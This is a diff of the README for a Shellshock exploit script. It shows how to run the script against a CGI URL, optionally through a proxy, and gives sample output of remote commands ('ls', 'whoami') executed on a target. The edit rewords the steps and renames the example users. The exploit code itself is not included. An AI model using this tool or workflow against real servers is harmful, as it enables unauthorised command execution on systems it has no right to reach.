@@ -8,13 +8,7 @@ Shellshocker suggests to avoid user-agent spoofing on-hand. In contrast to that 
   1. Run the script with python: "python shellshocker.py http://exam.com/cgi-bin/cat"
   
   
-  2. If you want to use it with proxy: "python shellshocker.py http://exam.com/cgi-bin/cat 192.168.1.5:3128"
-
-
-  3. Write command and hit enter
-
-
-  4. Get the output and back to 3 :)
+  2. Using proxy: "python shellshocker.py http://exam.com/cgi-bin/cat 192.168.1.5:3128"
 
 
 ### Examples:
@@ -24,8 +18,8 @@ shellshock/command$ ls -lath /home
 
 total 16K
 dr-xr-xr-x. 22 root    root    4.0K Feb  9 21:14 ..
-drwxrwxrwx.  2 bynarr  bynarr  4.0K Jan 27  2015 bynarr
-drwx------   2 apophis apophis 4.0K Jan  2  2015 apophis
+drwxrwxrwx.  2 tyrone  tyrone  4.0K Jan 27  2015 tyrone
+drwx------   2 reguser reguser 4.0K Jan  2  2015 reguser
 drwxr-xr-x.  4 root    root    4.0K Dec 30  2014 .
 
 shellshock/command$ whoami
